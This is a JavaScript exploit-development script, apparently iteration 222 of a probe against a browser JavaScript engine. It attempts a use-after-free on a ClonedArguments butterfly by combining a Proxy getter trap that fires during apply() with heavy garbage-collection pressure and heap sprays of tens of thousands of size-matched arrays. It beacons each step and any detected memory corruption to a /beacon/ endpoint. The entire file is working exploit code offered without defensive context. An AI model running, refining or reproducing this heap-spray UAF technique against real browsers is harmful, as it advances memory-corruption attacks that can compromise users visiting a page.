// p222 — ClonedArguments butterfly UAF with mega GC + spray
//
// V221 showed: Proxy trap fires, old butterfly has original data intact.
// The GC didn't sweep the orphaned butterfly allocation.
// Fix: 5 rounds of massive GC pressure to force full collection,
// then 80K spray arrays matching the old butterfly size class.
//
// Beacon prefix: V222-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V222-' + tag + '?t=' + Date.now();
      if (body) navigator.sendBeacon(url, body);
      else new Image().src = url;
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // ---- Phase 1: Warmup — verify trap fires ----
  try {
    var w = target(1,2,3,4,5,6,7,8);
    delete w[3];
    var cc = 0;
    Object.setPrototypeOf(w, new Proxy({}, { get: function() { cc++; return 0xAA; }}));
    var r = receiver.apply(null, w);
    B('WARMUP-' + r.length + '-c' + cc);
  } catch(e) { B('WARMUP-ERR-' + e.message.substring(0,40)); }

  // ---- Phase 2: Large butterfly UAF ----
  try {
    // Use 128-element args for a bigger butterfly: 8 + 128*8 = 1032 bytes
    var N = 128;
    var argArr = [];
    for (var i = 0; i < N; i++) argArr.push(i + 1);
    var args = target.apply(null, argArr);
    B('ARGS-' + args.length);

    delete args[7]; // hole at index 7
    var trapFired = false;
    var sprayArrs = [];

    var trap = {
      get: function(tgt, prop) {
        if (trapFired) return 0xFACE0001;
        trapFired = true;
        B('TRAP-' + prop);

        // Step 1: Force butterfly reallocation by growing to 4000 elements
        for (var j = 200; j < 4000; j++) args[j] = 0x41414141;
        B('GREW');

        // Step 2: MASSIVE GC pressure — 5 rounds
        // Each round: allocate 400K objects, drop them
        // This should trigger at least one full GC collection
        for (var round = 0; round < 5; round++) {
          var junk = [];
          for (var g = 0; g < 20; g++) {
            var batch = [];
            for (var k = 0; k < 20000; k++) batch.push({x:k, y:String(k), z:[k]});
            junk.push(batch);
          }
          junk.length = 0;
          junk = null;
        }
        B('GC5');

        // Step 3: Also allocate+free ArrayBuffers to pressure different heaps
        for (var ab = 0; ab < 500; ab++) {
          var tmp = new ArrayBuffer(1024);
          // touch it to ensure allocation
          new Uint8Array(tmp)[0] = 0;
        }
        B('ABGC');

        // Step 4: Spray — 80K arrays of exactly 128 elements
        // Old butterfly was 1032 bytes → matches bmalloc size class for 128-elem contiguous
        var SPRAY = 80000;
        for (var s = 0; s < SPRAY; s++) {
          var a = new Array(128);
          for (var f = 0; f < 128; f++) {
            a[f] = (0xC0FE0000 | (s & 0xFFFF)) >>> 0;
          }
          sprayArrs.push(a);
        }
        B('SPRAY-' + sprayArrs.length);

        // Also spray nearby size classes
        for (var s2 = 0; s2 < 10000; s2++) {
          var a2 = new Array(120);
          for (var f2 = 0; f2 < 120; f2++) a2[f2] = (0xD0AD0000 | (s2 & 0xFFFF)) >>> 0;
          sprayArrs.push(a2);
        }
        for (var s3 = 0; s3 < 10000; s3++) {
          var a3 = new Array(136);
          for (var f3 = 0; f3 < 136; f3++) a3[f3] = (0xDEAD0000 | (s3 & 0xFFFF)) >>> 0;
          sprayArrs.push(a3);
        }
        B('SPRAY-TOTAL-' + sprayArrs.length);

        return 0xBEEF0001;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));
    B('SETUP');

    var result;
    try {
      result = receiver.apply(null, args);
    } catch(e) {
      B('APPLY-ERR-' + e.message.substring(0,50));
      result = null;
    }

    if (result) {
      B('LEN-' + result.length);

      var corruptCount = 0;
      var vals = [];
      for (var r = 0; r < Math.min(result.length, 128); r++) {
        var v = result[r];
        var tag;
        if (typeof v === 'number') {
          var u = v >>> 0;
          var hi = u >>> 16;
          if (hi === 0xC0FE || hi === 0xD0AD || hi === 0xDEAD || hi === 0xBEEF || hi === 0xFACE) {
            corruptCount++;
            tag = hex(u);
          } else if (r >= 8 && r < N && v !== (r + 1)) {
            corruptCount++;
            tag = 'D:' + hex(u);
          } else {
            tag = hex(u);
          }
        } else if (v === undefined) {
          tag = 'und';
        } else if (typeof v === 'object') {
          corruptCount++;
          tag = 'OBJ';
        } else {
          tag = typeof v;
        }
        vals.push(r + '=' + tag);
      }

      B('VALS-A', vals.slice(0, 20).join(' '));
      B('VALS-B', vals.slice(20, 40).join(' '));
      B('VALS-C', vals.slice(Math.max(40, vals.length - 10)).join(' '));
      B('CORRUPT-' + corruptCount);

      if (corruptCount > 0) {
        B('UAF-CONFIRMED');
      } else {
        B('NO-CORRUPT');
      }
    }
  } catch(e) {
    B('P2-ERR-' + e.message.substring(0,50));
  }

  // ---- Phase 3: Alternative — use defineProperty to force slow mode ----
  setTimeout(function() {
    try {
      B('P3-START');
      var N2 = 64;
      var arr2 = [];
      for (var i = 0; i < N2; i++) arr2.push(i + 1);
      var args2 = target.apply(null, arr2);
      delete args2[5];

      var trapFired2 = false;
      var sprayArrs2 = [];

      var trap2 = {
        get: function() {
          if (trapFired2) return 0xFACE0002;
          trapFired2 = true;
          B('P3-TRAP');

          // Convert to slow mode (ArrayStorage) via defineProperty
          // This allocates a completely NEW butterfly with different layout
          Object.defineProperty(args2, '5', {
            value: 0x42424242,
            writable: false,
            configurable: true
          });
          B('P3-SLOWMODE');

          // GC rounds
          for (var round = 0; round < 3; round++) {
            var junk = [];
            for (var g = 0; g < 10; g++) {
              var batch = [];
              for (var k = 0; k < 20000; k++) batch.push({x:k});
              junk.push(batch);
            }
            junk = null;
          }

          // Spray matching old size: 8 + 64*8 = 520 bytes
          for (var s = 0; s < 50000; s++) {
            var a = new Array(64);
            for (var f = 0; f < 64; f++) a[f] = (0xAABB0000 | (s & 0xFFFF)) >>> 0;
            sprayArrs2.push(a);
          }
          B('P3-SPRAY-' + sprayArrs2.length);

          return 0xBEEF0002;
        }
      };

      Object.setPrototypeOf(args2, new Proxy({}, trap2));

      var result2 = receiver.apply(null, args2);
      if (result2) {
        var corr2 = 0;
        var v2 = [];
        for (var r = 0; r < Math.min(result2.length, 64); r++) {
          var val = result2[r];
          if (typeof val === 'number') {
            var u = val >>> 0;
            var hi = u >>> 16;
            if (hi === 0xAABB || hi === 0xBEEF || hi === 0xFACE) {
              corr2++;
              v2.push(r + '=' + hex(u));
            } else if (r >= 6 && r < N2 && val !== (r + 1)) {
              corr2++;
              v2.push(r + '=D:' + hex(u));
            }
          }
        }
        B('P3-CORRUPT-' + corr2);
        if (v2.length > 0) B('P3-HITS', v2.slice(0, 20).join(' '));
        if (corr2 > 0) B('P3-UAF-CONFIRMED');
      }
    } catch(e) {
      B('P3-ERR-' + e.message.substring(0,50));
    }
    B('DONE');
  }, 2000);
})();
